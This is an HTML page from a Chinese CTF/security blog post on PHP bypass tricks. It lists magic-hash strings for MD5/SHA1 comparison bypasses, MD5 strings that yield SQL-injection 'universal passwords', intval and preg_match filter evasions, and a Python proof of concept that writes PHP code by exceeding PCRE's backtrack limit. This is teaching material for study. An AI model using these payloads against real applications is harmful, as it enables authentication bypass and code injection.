@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP的一些小技巧 | root@wanth3f1ag</title><meta name="author" content="wanTh3flag"><meta name="copyright" content="wanTh3flag"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="关于md5和sha1绕过1.数组绕过对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。 2.0e绕过对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同 md5加密后是0e开头的： 12345678240610708:0e4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP的一些小技巧">
+<meta property="og:url" content="http://example.com/2025/04/03/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="关于md5和sha1绕过1.数组绕过对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。 2.0e绕过对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同 md5加密后是0e开头的： 12345678240610708:0e4">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/8.jpg">
+<meta property="article:published_time" content="2025-04-03T07:37:51.000Z">
+<meta property="article:modified_time" content="2025-04-04T16:34:31.252Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="php小技巧">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/8.jpg"><link rel="shortcut icon" href="/image/avatar.jpg"><link rel="canonical" href="http://example.com/2025/04/03/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP的一些小技巧',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-05 00:34:31',
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/image/8.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">root@wanth3f1ag</span></a><a class="nav-page-title" href="/"><span class="site-name">PHP的一些小技巧</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user-circle"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP的一些小技巧</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-03T07:37:51.000Z" title="发表于 2025-04-03 15:37:51">2025-04-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-04T16:34:31.252Z" title="更新于 2025-04-05 00:34:31">2025-04-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E7%A7%AF%E7%B4%AF/">知识点积累</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="关于md5和sha1绕过"><a href="#关于md5和sha1绕过" class="headerlink" title="关于md5和sha1绕过"></a>关于md5和sha1绕过</h1><h2 id="1-数组绕过"><a href="#1-数组绕过" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h2><p>对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
+<h2 id="2-0e绕过"><a href="#2-0e绕过" class="headerlink" title="2.0e绕过"></a>2.0e绕过</h2><p>对于某些特殊的字符串加密后得到的密文以0e开头，PHP会当作科学计数法来处理，也就是0的n次方，得到的值比较的时候都相同</p>
+<p>md5加密后是0e开头的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">240610708:0e462097431906509019562988736854</span><br><span class="line">QLTHNDT:0e405967825401955372549139051580</span><br><span class="line">QNKCDZO:0e830400451993494058024219903391</span><br><span class="line">PJNPDWY:0e291529052894702774557631701704</span><br><span class="line">NWWKITQ:0e763082070976038347657360817689</span><br><span class="line">NOOPCJF:0e818888003657176127862245791911</span><br><span class="line">MMHUWUV:0e701732711630150438129209816536</span><br><span class="line">MAUXXQC:0e478478466848439040434801845361</span><br></pre></td></tr></table></figure>
+
+<p>sha1加密后是0e开头的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10932435112: 0e07766915004133176347055865026311692244</span><br><span class="line">aaroZmOk: 0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY: 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF: 0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m: 0e36977786278517984959260394024281014729</span><br><span class="line">0e1290633704: 0e19985187802402577070739524195726831799</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-双重md5下的0e绕过"><a href="#3-双重md5下的0e绕过" class="headerlink" title="3.双重md5下的0e绕过"></a>3.双重md5下的0e绕过</h2><p>以下字符串进行两次md5后以0e开头</p>
+<ul>
+<li><code>7r4lGXCH2Ksu2JNT3BYM</code></li>
+<li><code>CbDLytmyGm2xQyaLNhWn</code></li>
+<li><code>770hQgrBOjrcqftrlaZk</code></li>
+</ul>
+<h2 id="4-md5绕过SQL"><a href="#4-md5绕过SQL" class="headerlink" title="4.md5绕过SQL"></a>4.md5绕过SQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop，经过md5函数后结果为 &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c；</span><br><span class="line"></span><br><span class="line">129581926211651571912466741651878684928，经过md5函数后结果为 \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8；</span><br></pre></td></tr></table></figure>
+
+<p>这两个加密后都是万能密码</p>
+<h2 id="5-md5-sha1-加密后弱等于初始值"><a href="#5-md5-sha1-加密后弱等于初始值" class="headerlink" title="5.md5(sha1)加密后弱等于初始值"></a>5.md5(sha1)加密后弱等于初始值</h2><p><code>$a==md5($a)</code></p>
+<p><code>0e215962017</code> 的 MD5 值也是由 <strong>0e</strong> 开头，在 PHP 弱类型比较中相等</p>
+<p><strong>$a&#x3D;&#x3D;sha1($a)</strong></p>
+<p>0e1290633704的sha1值也是由0e开头的，在弱比较中相等</p>
+<h2 id="6-图片文本强碰撞绕过"><a href="#6-图片文本强碰撞绕过" class="headerlink" title="6.图片文本强碰撞绕过"></a>6.图片文本强碰撞绕过</h2><p>可以用工具fastcoll（md5强碰撞生成工具）</p>
+<p>例如我们需要生成两个md5值相同的图片&#x2F;文本，可以利用工具去生成</p>
+<p><img src="/../image/achieve/202411/XYCTF2024/9ed27e530d8b8e2ec0c225fe8a85d8ec.png" alt="9ed27e530d8b8e2ec0c225fe8a85d8ec"></p>
+<h1 id="intval-函数漏洞绕过"><a href="#intval-函数漏洞绕过" class="headerlink" title="intval()函数漏洞绕过"></a>intval()函数漏洞绕过</h1><h2 id="什么是intval-？"><a href="#什么是intval-？" class="headerlink" title="什么是intval()？"></a>什么是intval()？</h2><p><code>intval()</code> 函数是 PHP 中的一个内置函数，用于获取变量的整数值。常用于强制类型转换。</p>
+<p>基础语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(mixed $value, int $base = 10): int</span><br></pre></td></tr></table></figure>
+
+<p>参数：</p>
+<ul>
+<li>$var：需要转换成 integer 的「变量」</li>
+<li>$base：转换所使用的「进制」</li>
+</ul>
+<p><strong>注意</strong>:</p>
+<p>如果 <code>base</code> 是 0，通过检测 <code>value</code> 的格式来决定使用的进制：</p>
+<ul>
+<li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li>
+<li>如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，</li>
+<li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li>
+<li>将使用 10 进制 (decimal)。</li>
+</ul>
+<p>返回值</p>
+<p>成功时返回 <code>value</code> 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p>
+<p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42</span>);          <span class="comment">//42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">42.2</span>);        <span class="comment">//42</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">042</span>);         <span class="comment">//34</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="number">0x42</span>);        <span class="comment">//66</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>));     <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>());           <span class="comment">//0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><ul>
+<li>当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。</li>
+<li>对于弱比较（a&#x3D;&#x3D;b），可以给a、b两个参数传入空数组，使弱比较为true。</li>
+<li>当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。</li>
+<li>当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。</li>
+<li>当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。</li>
+<li>当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。</li>
+</ul>
+<h1 id="关于preg-match-绕过"><a href="#关于preg-match-绕过" class="headerlink" title="关于preg_match()绕过"></a>关于preg_match()绕过</h1><h2 id="什么是preg-match？"><a href="#什么是preg-match？" class="headerlink" title="什么是preg_match？"></a>什么是preg_match？</h2><p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403142430100.png" alt="image-20250403142430100"></p>
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><ul>
+<li>数组绕过</li>
+</ul>
+<p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p>
+<ul>
+<li>换行符绕过</li>
+</ul>
+<p>特殊字符<code>.</code>在正则表达式中可以匹配任何字符串，换行符除外</p>
+<p>例如我们这里有代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*(flag).*$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配成功&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;匹配失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们传入a&#x3D;flag，就满足了正则匹配，返回匹配成功</p>
+<p>如果我们传入a&#x3D;%0aflag,就能绕过正则匹配，返回匹配失败，这是为什么呢？</p>
+<p>当传入 <code>a=\nflag</code> 时：</p>
+<ol>
+<li><p><strong><code>^</code></strong> - 匹配字符串开头</p>
+</li>
+<li><p><code>.*</code>- 尝试贪婪匹配：</p>
+<ul>
+<li>默认情况下 <code>.</code> 不匹配换行符 <code>\n</code></li>
+<li>所以 <code>.*</code> 在这里匹配空字符串</li>
+</ul>
+</li>
+<li><p>剩余字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\nflag</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>需要匹配 <code>(flag)</code>，但开头是 <code>\n</code></li>
+<li>无法匹配 <code>f</code>，所以整体匹配失败</li>
+</ul>
+</li>
+<li><p><strong>返回0</strong>（不匹配）</p>
+</li>
+</ol>
+<p><code>*</code> 是贪婪量词，会尽可能多地匹配字符。当后续匹配失败时，会逐步”吐出”已匹配的字符（回溯）。</p>
+<h2 id="PHP利用PCRE回溯次数限制绕过"><a href="#PHP利用PCRE回溯次数限制绕过" class="headerlink" title="PHP利用PCRE回溯次数限制绕过"></a>PHP利用PCRE回溯次数限制绕过</h2><p>参考P牛的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<p>实例代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_php</span>(<span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析一下就是判断用户输入的内容有没有php代码，如果没有就写入文件，显而易见我们需要绕过这个正则匹配去写入我们期望的代码，这时候该怎么做呢？</p>
+<h2 id="正则引擎"><a href="#正则引擎" class="headerlink" title="正则引擎"></a>正则引擎</h2><p>常见的正则引擎，往往被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机），他们匹配的过程是这样的</p>
+<ul>
+<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入(线性匹配)</li>
+<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态(回溯机制)</li>
+</ul>
+<p>大多数编程语言都采用的NFA作为正则引擎，其中也包括PHP使用的PCRE库</p>
+<h2 id="回溯的过程"><a href="#回溯的过程" class="headerlink" title="回溯的过程"></a>回溯的过程</h2><p>例如p牛这里测试了一个案例</p>
+<p>假设匹配的输入是<code>&lt;?php phpinfo();//aaaaa</code>，实际执行流程是这样的：</p>
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png" alt="image.png"></p>
+<p>可以看见在第四步的时候，由于<code>.*</code>贪婪匹配机制，第一个<code>.*</code>最终匹配到我们输入的字符串的结尾(<code>&lt;?php phpinfo();//aaaaa</code>)，但这样的话后面的匹配就匹配不上，因为在<code>.*</code>后还应该匹配**[(`;?&gt;]*<em>，所以NFA开始回溯匹配，从末尾开始，先吐出一个a，此时&#96;.</em><code>匹配的是</code><?php phpinfo();//aaaa`，尝试用**[(\`;?>]**去匹配a，但仍然匹配不上，继续回溯，再吐出一个a，尝试匹配aa，但仍然不行……</p>
+<p>一直回溯直到第12步，此时<code>.*</code>匹配的是<code>&lt;?php phpinfo()</code>后面的<code>;</code>则匹配上**[(`;?&gt;]*<em>，此时这个结果才能满足正则表达式的结果，于是就不再回溯，继续向后匹配表达式，第二个&#96;.</em>&#96;匹配到了字符串末尾，最后结束匹配。</p>
+<p>以上就是NFA的回溯机制。</p>
+<h2 id="关于PHP的pcre-backtrack-limit限制利用"><a href="#关于PHP的pcre-backtrack-limit限制利用" class="headerlink" title="关于PHP的pcre.backtrack_limit限制利用"></a>关于PHP的pcre.backtrack_limit限制利用</h2><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p>
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403150831133.png" alt="image-20250403150831133"></p>
+<p>在官方文档中也有写到</p>
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403150958553.png" alt="image-20250403150958553"></p>
+<p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会造成什么结果呢？我们尝试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(preg_match(&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;,&#x27;&lt;?php phpinfo();//&#x27; . str_repeat(&#x27;c&#x27;,1000000)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/XYCTF2024/image-20250403151342526.png" alt="image-20250403151342526"></p>
+<p>结果返回了false，而并非1和0，<code>preg_match</code>函数返回false表示此次执行失败了</p>
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403151628711.png" alt="image-20250403151628711"></p>
+<p>我们可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR</span><br></pre></td></tr></table></figure>
+
+<p>这行代码用于<strong>检测最后一次PCRE正则操作是否因回溯限制而失败</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>组成部分</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>preg_last_error()</code></td>
+<td>PHP函数，返回最后一次PCRE正则操作的错误代码</td>
+</tr>
+<tr>
+<td><code>PREG_BACKTRACK_LIMIT_ERROR</code></td>
+<td>PHP常量，值为2，表示正则匹配超出最大回溯限制</td>
+</tr>
+<tr>
+<td><code>===</code></td>
+<td>比较运算符，检查值和类型是否完全一致</td>
+</tr>
+</tbody></table>
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403151741726.png" alt="image-20250403151741726"></p>
+<p>这里返回true，说明确实是因为超出了最大回溯限制而执行失败</p>
+<p>所以上面那道例题的答案就很明显了，可以通过发送超长字符串使正则执行失败，让我们的php代码成功写入</p>
+<p>最终的exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line">    </span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: <span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;aaa&lt;?php phpinfo();//&#x27;</span> + b<span class="string">&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.<span class="title function_ invoke__">post</span>(url=url, files=files, allow_redirects=False)</span><br><span class="line"><span class="keyword">print</span>(r.headers)</span><br></pre></td></tr></table></figure>
+
+<h1 id="preg-replace-e-模式下的RCE"><a href="#preg-replace-e-模式下的RCE" class="headerlink" title="preg_replace &#x2F;e 模式下的RCE"></a>preg_replace &#x2F;e 模式下的RCE</h1><p>限制版本：PHP &lt;&#x3D;5.5</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E5%89%8D%E8%A8%80">深入研究preg_replace与代码执行</a></p>
+<h2 id="什么是preg-replace-函数？"><a href="#什么是preg-replace-函数？" class="headerlink" title="什么是preg_replace()函数？"></a>什么是<strong>preg_replace</strong>()函数？</h2><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(</span><br><span class="line">    string|array $pattern,</span><br><span class="line">    string|array $replacement,</span><br><span class="line">    string|array $subject,</span><br><span class="line">    int $limit = -1,</span><br><span class="line">    int &amp;$count = null</span><br><span class="line">): string|array|null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/image-20250403154616821.png" alt="image-20250403154616821"></p>
